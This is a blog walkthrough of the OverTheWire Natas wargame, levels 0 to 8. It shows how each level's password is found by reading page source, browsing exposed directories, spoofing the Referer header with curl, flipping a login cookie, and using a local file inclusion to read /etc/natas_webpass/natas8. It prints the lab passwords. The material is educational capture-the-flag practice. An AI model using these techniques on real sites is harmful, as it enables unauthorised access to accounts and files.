@@ -1,0 +1,1338 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> Over The Wire - Natas Walkthrough | José Duarte</title>
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="Over The Wire - Natas Walkthrough" />
+<meta property="og:description" content="Level 0 Using right-click anywhere on the page should show a menu from where you can select &ldquo;View Page Source&rdquo;, clicking it will show you the page source code. From where you&rsquo;ll see:
+&lt;div id=&#34;content&#34;&gt; You can find the password for the next level on this page. &lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt; &lt;/div&gt; We got our password! Open http://natas1.natas.labs.overthewire.org/ and head on to the next level!
+Level 1 So, in this level they disabled right-clicking (or at least they tried, in Firefox you&rsquo;re able to right-click just fine)." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jmg-duarte.github.io/posts/otw/natas/" />
+<meta property="article:published_time" content="2019-03-24T15:59:46+00:00" />
+<meta property="article:modified_time" content="2019-03-24T15:59:46+00:00" />
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Over The Wire - Natas Walkthrough"/>
+<meta name="twitter:description" content="Level 0 Using right-click anywhere on the page should show a menu from where you can select &ldquo;View Page Source&rdquo;, clicking it will show you the page source code. From where you&rsquo;ll see:
+&lt;div id=&#34;content&#34;&gt; You can find the password for the next level on this page. &lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt; &lt;/div&gt; We got our password! Open http://natas1.natas.labs.overthewire.org/ and head on to the next level!
+Level 1 So, in this level they disabled right-clicking (or at least they tried, in Firefox you&rsquo;re able to right-click just fine)."/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://jmg-duarte.github.io/css/style-white.css">
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://jmg-duarte.github.io/images/favicon.ico" />
+
+  
+</head>
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/about">About</a></li>
+         
+        <li><a href="/posts">Posts</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://jmg-duarte.github.io/about/">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="https://jmg-duarte.github.io/posts/otw/leviathan/">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f&text=Over%20The%20Wire%20-%20Natas%20Walkthrough">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f&title=Over%20The%20Wire%20-%20Natas%20Walkthrough">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f&is_video=false&description=Over%20The%20Wire%20-%20Natas%20Walkthrough">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Over%20The%20Wire%20-%20Natas%20Walkthrough&body=Check out this article: https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f&title=Over%20The%20Wire%20-%20Natas%20Walkthrough">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f&title=Over%20The%20Wire%20-%20Natas%20Walkthrough">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f&title=Over%20The%20Wire%20-%20Natas%20Walkthrough">
+      <i class="fab fa-stumbleupon " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f&title=Over%20The%20Wire%20-%20Natas%20Walkthrough">
+      <i class="fab fa-digg " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f&name=Over%20The%20Wire%20-%20Natas%20Walkthrough&description=Level%200%20Using%20right-click%20anywhere%20on%20the%20page%20should%20show%20a%20menu%20from%20where%20you%20can%20select%20%26ldquo%3bView%20Page%20Source%26rdquo%3b%2c%20clicking%20it%20will%20show%20you%20the%20page%20source%20code.%20From%20where%20you%26rsquo%3bll%20see%3a%0a%26lt%3bdiv%20id%3d%26%2334%3bcontent%26%2334%3b%26gt%3b%20You%20can%20find%20the%20password%20for%20the%20next%20level%20on%20this%20page.%20%26lt%3b%21--The%20password%20for%20natas1%20is%20gtVrDuiDfck831PqWsLEZy5gyDz1clto%20--%26gt%3b%20%26lt%3b%2fdiv%26gt%3b%20We%20got%20our%20password%21%20Open%20http%3a%2f%2fnatas1.natas.labs.overthewire.org%2f%20and%20head%20on%20to%20the%20next%20level%21%0aLevel%201%20So%2c%20in%20this%20level%20they%20disabled%20right-clicking%20%28or%20at%20least%20they%20tried%2c%20in%20Firefox%20you%26rsquo%3bre%20able%20to%20right-click%20just%20fine%29.">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f&t=Over%20The%20Wire%20-%20Natas%20Walkthrough">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#example">Example</a></li>
+  </ul>
+</nav>
+    </div>
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        Over The Wire - Natas Walkthrough
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2019-03-24 15:59:46 &#43;0000 UTC" itemprop="datePublished">2019-03-24</time>
+          
+        </div>
+        
+        
+      </div>
+    </header>
+
+  
+    <div class="content" itemprop="articleBody">
+      <h1 id="level-0">Level 0</h1>
+<p>Using right-click anywhere on the page should show a menu from where you can select &ldquo;<em>View Page Source</em>&rdquo;, clicking it will show you the page source code. From where you&rsquo;ll see:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;content&#34;</span><span style="color:#111">&gt;</span>
+You can find the password for the next level on this page.
+
+<span style="color:#75715e">&lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt;</span>
+<span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
+</code></pre></div><p>We got our password!
+Open <a href="http://natas1.natas.labs.overthewire.org/">http://natas1.natas.labs.overthewire.org/</a> and head on to the next level!</p>
+<h1 id="level-1">Level 1</h1>
+<p>So, in this level they disabled right-clicking (or at least they tried, in Firefox you&rsquo;re able to right-click just fine).
+You have several ways to go around this!</p>
+<p>For Firefox (besides right clicking) and Chrome you can:</p>
+<ul>
+<li>Write <code>view-source:</code> before the URL and you&rsquo;ll be able to see the source, just like before</li>
+<li>Use the shortcut for the Inspector - <code>Ctrl + Shift + I</code></li>
+</ul>
+<p>Afterwards you&rsquo;ll be able to see the following on the page source code</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;content&#34;</span><span style="color:#111">&gt;</span>
+You can find the password for the
+next level on this page, but rightclicking has been blocked!
+
+<span style="color:#75715e">&lt;!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --&gt;</span>
+<span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
+</code></pre></div><p>And just like that we have the password for our Level 2!</p>
+<h1 id="level-2">Level 2</h1>
+<p>Opening up Level 2, the webpage greets us with <em>There is nothing on this page</em>, however, since we are curious people we go to the page source code once more!</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">h1</span><span style="color:#111">&gt;</span>natas2<span style="color:#111">&lt;/</span><span style="color:#f92672">h1</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;content&#34;</span><span style="color:#111">&gt;</span>
+    There is nothing on this page
+    <span style="color:#111">&lt;</span><span style="color:#f92672">img</span> <span style="color:#75af00">src</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;files/pixel.png&#34;</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
+</code></pre></div><p>Hmmm, that image is looking suspicious! In fact, if we actually try to download it, it&rsquo;s just one pixel. Useless&hellip;</p>
+<p>But the <code>pixel.png</code> is linked with a relative path, inside a directory! Maybe it&rsquo;s accessible! We paste <code>files/</code> in the end of our link and bingo!</p>
+<p><img src="/otw_natas/level2.png" alt="level2"></p>
+<p>Given that we already checked the <code>pixel.png</code> we can head on to the <code>users.txt</code>, click it!</p>
+<pre><code># username:password
+alice:BYNdCesZqW
+bob:jw2ueICLvT
+charlie:G5vCxkVV3m
+natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+eve:zo4mJWyNj2
+mallory:9urtcpzBmH
+</code></pre><p>There is the password! We can now go on to Level 3!</p>
+<h1 id="level-3">Level 3</h1>
+<p>On Level 3 we are greeted once more with <em>There is nothing on this page</em> and once more we head to the source code!</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;content&#34;</span><span style="color:#111">&gt;</span>
+There is nothing on this page
+<span style="color:#75715e">&lt;!-- No more information leaks!! Not even Google will find it this time... --&gt;</span>
+<span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
+</code></pre></div><p>A clue! If Google can&rsquo;t find the password it must mean it was disallowed on the <a href="http://www.robotstxt.org/robotstxt.html"><code>robots.txt</code></a>!
+Lets head on to it and see for ourselves, paste <code>/robots.txt</code> in the URL again.</p>
+<pre><code>User-agent: *
+Disallow: /s3cr3t/
+</code></pre><p>Found it! Now let&rsquo;s see what&rsquo;s inside, going to <code>http://natas3.natas.labs.overthewire.org/s3cr3t/</code> we find:</p>
+<p><img src="/otw_natas/level3.png" alt="level3"></p>
+<p>And again, we click it to find:</p>
+<pre><code>natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+</code></pre><h1 id="level-4">Level 4</h1>
+<p>This time we are greeted with a clue!</p>
+<blockquote>
+<p>Access disallowed. You are visiting from &quot;&quot; while authorized users should come only from &ldquo;<a href="http://natas5.natas.labs.overthewire.org/%22">http://natas5.natas.labs.overthewire.org/&quot;</a></p>
+</blockquote>
+<p>Which implies that authorized users must come from <code>http://natas5.natas.labs.overthewire.org/</code>, in another words we need to be redirected from Level 5.</p>
+<p>Trying to log into Level 5 won&rsquo;t work, we can however pretend we came from there!
+Looking at the Wikipedia page for <a href="https://en.wikipedia.org/wiki/List_of_HTTP_header_fields">HTTP headers</a> we will find the Referer, which has its own <a href="https://en.wikipedia.org/wiki/HTTP_referer">page</a>!</p>
+<p>And the following description:</p>
+<blockquote>
+<p>This is the address of the previous web page from which a link to the currently requested page was followed. (The word “referrer” has been misspelled in the RFC as well as in most implementations to the point that it has become standard usage and is considered correct terminology)</p>
+</blockquote>
+<p>Which in other words means we can use it to pretend we came from anywhere!</p>
+<p>For this we could use Python with <code>requests</code>, however using <code>curl</code> is much more straightforward for this.</p>
+<p>The command we will use is:</p>
+<pre><code>curl -X GET \
+    --header &quot;Referer:http://natas5.natas.labs.overthewire.org/&quot; \
+    -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ \
+    http://natas4.natas.labs.overthewire.org/index.php
+</code></pre><p>We can break it down to three flags:</p>
+<ul>
+<li><code>-X</code> allows us to specify what kind of HTTP request we wish to make, we use <code>GET</code> since it&rsquo;s
+the <em>standard</em> way - you can read more about them <a href="https://www.w3schools.com/tags/ref_httpmethods.asp">here</a></li>
+<li><code>--header</code> gives us the ability to write our own header, using it to define the <code>Referer</code> -
+this could be replaced with <code>-e http://natas5.natas.labs.overthewire.org/</code> which yields exactly the same request</li>
+<li><code>u</code> allows us to use <a href="https://en.wikipedia.org/wiki/Basic_access_authentication">Basic Access Authentication</a> to access Level 4</li>
+</ul>
+<p><code>curl</code> then proceeds to download the web page and print it to <code>stdout</code>.</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;content&#34;</span><span style="color:#111">&gt;</span>
+
+Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+<span style="color:#111">&lt;</span><span style="color:#f92672">br</span><span style="color:#111">/&gt;</span>
+</code></pre></div><p>Perfect!</p>
+<h1 id="level-5">Level 5</h1>
+<p>Hitting Level 5 we get <code>Access disallowed. You are not logged in</code>! Bummer!</p>
+<p>Once more we hit the Inspect, however this time we have nothing, no clues&hellip;</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">body</span><span style="color:#111">&gt;</span>
+    <span style="color:#111">&lt;</span><span style="color:#f92672">h1</span><span style="color:#111">&gt;</span>natas5<span style="color:#111">&lt;/</span><span style="color:#f92672">h1</span><span style="color:#111">&gt;</span>
+    <span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;content&#34;</span><span style="color:#111">&gt;</span>
+        Access disallowed. You are not logged in
+    <span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;/</span><span style="color:#f92672">body</span><span style="color:#111">&gt;</span>
+</code></pre></div><p>Introducing the Network and the Storage tabs! Hopefully you&rsquo;re not blind (if you are, how are you reading this?), or your browser didn&rsquo;t hid it from you (if it did, enable it), otherwise you should have already noticed them (those last two)!</p>
+<p><img src="/otw_natas/level5.png" alt="level5"></p>
+<p>In the Network tab we can see a trace of the requests made from the moment you load the page.</p>
+<p><img src="/otw_natas/level5_1.png" alt="level5_1"></p>
+<p>Here, we&rsquo;re only interested in the <code>document</code> (the first one), upon close inspection we can notice both <code>Request</code> and <code>Response</code> headers refer a cookie - <code>loggedin=0</code></p>
+<p>Well, clearly <code>0</code> is not working out so we need to change it! Heading over to the Storage tab we can change stored cookies and so we change our cookie to <code>1</code>.</p>
+<p>Press F5 and <code>Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</code>, we got it!</p>
+<h1 id="level-6">Level 6</h1>
+<p>Now things get a little different. We are no longer only dealing with the webpage itself and we are given a <code>.php</code> snippet (the source)</p>
+<blockquote>
+<p>Disclaimer - I hate PHP</p>
+</blockquote>
+<p>Before we even try and use the fancy interface, we should look at the source code.</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span>
+<span style="color:#00a8c8">include</span> <span style="color:#d88200">&#34;includes/secret.inc&#34;</span><span style="color:#111">;</span>
+    <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;submit&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_POST</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#111">$secret</span> <span style="color:#f92672">==</span> <span style="color:#111">$_POST</span><span style="color:#111">[</span><span style="color:#d88200">&#39;secret&#39;</span><span style="color:#111">])</span> <span style="color:#111">{</span>
+            <span style="color:#00a8c8">print</span> <span style="color:#d88200">&#34;Access granted. The password for natas7 is &lt;censored&gt;&#34;</span><span style="color:#111">;</span>
+        <span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#111">{</span>
+            <span style="color:#00a8c8">print</span> <span style="color:#d88200">&#34;Wrong secret&#34;</span><span style="color:#111">;</span>
+        <span style="color:#111">}</span>
+    <span style="color:#111">}</span>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Hmm, so the file seems to be importing another file <code>secret.inc</code> and then use <code>$secret</code> to check if our <code>secret</code> field in the <code>POST</code> request match.</p>
+<p>As usual, we dive head first into the <code>includes/secret.inc</code> pasting it into the URL.
+Arriving there we see, <em><strong>nothing</strong></em>, well for a second I almost fell for it, never forget to inspect the page!</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!--? $secret = &#34;FOEIUWGHFEEUHOFUOIU&#34;; ?--&gt;</span>
+<span style="color:#111">&lt;</span><span style="color:#f92672">html</span><span style="color:#111">&gt;</span>
+    <span style="color:#111">&lt;</span><span style="color:#f92672">head</span><span style="color:#111">&gt;&lt;/</span><span style="color:#f92672">head</span><span style="color:#111">&gt;</span>
+    <span style="color:#111">&lt;</span><span style="color:#f92672">body</span><span style="color:#111">&gt;&lt;/</span><span style="color:#f92672">body</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;/</span><span style="color:#f92672">html</span><span style="color:#111">&gt;</span>
+</code></pre></div><p>Aha! The first line has the code! Now we just need to go back, paste it into the text field and submit!</p>
+<p>Voilá! We are greeted with:</p>
+<p><code>Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</code></p>
+<h1 id="level-7">Level 7</h1>
+<p>The page in Level 7 is dead simple. Two links, one for <code>Home</code> and another for <code>About</code>.</p>
+<p>Clicking them doesn&rsquo;t do much (yet) and reading the source we find:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;content&#34;</span><span style="color:#111">&gt;</span>
+
+<span style="color:#111">&lt;</span><span style="color:#f92672">a</span> <span style="color:#75af00">href</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;index.php?page=home&#34;</span><span style="color:#111">&gt;</span>Home<span style="color:#111">&lt;/</span><span style="color:#f92672">a</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;</span><span style="color:#f92672">a</span> <span style="color:#75af00">href</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;index.php?page=about&#34;</span><span style="color:#111">&gt;</span>About<span style="color:#111">&lt;/</span><span style="color:#f92672">a</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;</span><span style="color:#f92672">br</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;</span><span style="color:#f92672">br</span><span style="color:#111">&gt;</span>
+this is the front page
+
+<span style="color:#75715e">&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;</span>
+<span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
+</code></pre></div><p>However how can we access it? There&rsquo;s no input&hellip;
+However when we click one of the links we see the page URL change.</p>
+<ul>
+<li>For the <code>Home</code> page we see <code>.../index.php?page=home</code></li>
+<li>And for the <code>About</code> page <code>.../index.php?page=about</code></li>
+</ul>
+<p>Maybe we could try something with it, since the server, when looking for the pages probably looks in the filesystem using the <code>page</code> variable value.</p>
+<p>We know that all passwords are located in <code>/etc/natas_webpass/natasX</code> so we go ahead and paste it on to our query string making it <code>page=/etc/natas_webpass/natas8</code> and we get our password.</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;content&#34;</span><span style="color:#111">&gt;</span>
+
+<span style="color:#111">&lt;</span><span style="color:#f92672">a</span> <span style="color:#75af00">href</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;index.php?page=home&#34;</span><span style="color:#111">&gt;</span>Home<span style="color:#111">&lt;/</span><span style="color:#f92672">a</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;</span><span style="color:#f92672">a</span> <span style="color:#75af00">href</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;index.php?page=about&#34;</span><span style="color:#111">&gt;</span>About<span style="color:#111">&lt;/</span><span style="color:#f92672">a</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;</span><span style="color:#f92672">br</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;</span><span style="color:#f92672">br</span><span style="color:#111">&gt;</span>
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+<span style="color:#75715e">&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;</span>
+<span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
+</code></pre></div><p>This is called a File Inclusion Vulnerability! You can read more about it <a href="https://en.wikipedia.org/wiki/File_inclusion_vulnerability">here</a> and <a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion">here</a>.</p>
+<p>Remember to always validate your inputs!</p>
+<h1 id="level-8">Level 8</h1>
+<p>Again, more PHP. Let&rsquo;s make quick!</p>
+<p>We go straight for the source code, because what is better than the source?
+Reading the source code we see the following snippet:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span>
+<span style="color:#111">$encodedSecret</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;3d3d516343746d4d6d6c315669563362&#34;</span><span style="color:#111">;</span>
+
+<span style="color:#00a8c8">function</span> <span style="color:#75af00">encodeSecret</span><span style="color:#111">(</span><span style="color:#111">$secret</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+    <span style="color:#00a8c8">return</span> <span style="color:#75af00">bin2hex</span><span style="color:#111">(</span><span style="color:#75af00">strrev</span><span style="color:#111">(</span><span style="color:#75af00">base64_encode</span><span style="color:#111">(</span><span style="color:#111">$secret</span><span style="color:#111">)));</span>
+<span style="color:#111">}</span>
+
+<span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;submit&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_POST</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+    <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">encodeSecret</span><span style="color:#111">(</span><span style="color:#111">$_POST</span><span style="color:#111">[</span><span style="color:#d88200">&#39;secret&#39;</span><span style="color:#111">])</span> <span style="color:#f92672">==</span> <span style="color:#111">$encodedSecret</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">print</span> <span style="color:#d88200">&#34;Access granted. The password for natas9 is &lt;censored&gt;&#34;</span><span style="color:#111">;</span>
+    <span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">print</span> <span style="color:#d88200">&#34;Wrong secret&#34;</span><span style="color:#111">;</span>
+    <span style="color:#111">}</span>
+<span style="color:#111">}</span>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>We have one function that encodes a secret to <a href="https://en.wikipedia.org/wiki/Base64">Base64</a>,
+reverses the resulting string and converts the string to <a href="https://en.wikipedia.org/wiki/Hexadecimal">hexadecimal</a>
+(yes, <a href="https://www.php.net/manual/en/function.bin2hex.php"><code>bin2hex</code></a> is not binary to hexadecimal,
+always search before assuming anything - like I did the first time).</p>
+<p>After the function we have the actual script part, it checks if the <code>submit</code> variable exists in the request,
+if it exists it encodes the <code>secret</code> variable using <code>encodeSecret</code> and compares with the <code>$encodedSecret</code> variable,
+if they match we get the password!</p>
+<p>Since all operations done by <code>encodeSecret</code> are reversible we can start getting to work!</p>
+<ul>
+<li>First we will take <code>$encodedSecret</code> and convert it from hexadecimal to a string again</li>
+<li>Then we reverse the string order</li>
+<li>Finally we decode the Base64 result</li>
+</ul>
+<p>The resulting script more or less like this:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#75af00">php</span>
+<span style="color:#111">$encodedSecret</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;3d3d516343746d4d6d6c315669563362&#34;</span><span style="color:#111">;</span>
+
+<span style="color:#00a8c8">function</span> <span style="color:#75af00">decodeSecret</span><span style="color:#111">(</span><span style="color:#111">$secret</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+  <span style="color:#00a8c8">return</span> <span style="color:#75af00">base64_decode</span><span style="color:#111">(</span><span style="color:#75af00">strrev</span><span style="color:#111">(</span><span style="color:#75af00">hex2bin</span><span style="color:#111">(</span><span style="color:#111">$secret</span><span style="color:#111">)));</span>
+<span style="color:#111">}</span>
+<span style="color:#00a8c8">echo</span> <span style="color:#75af00">decodeSecret</span><span style="color:#111">(</span><span style="color:#111">$encodedSecret</span><span style="color:#111">);</span>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Running this yields our secret which we now need to <code>POST</code> to the server.
+We can simply send it by submitting it on the actual page, doing that we get the Level 9 password!</p>
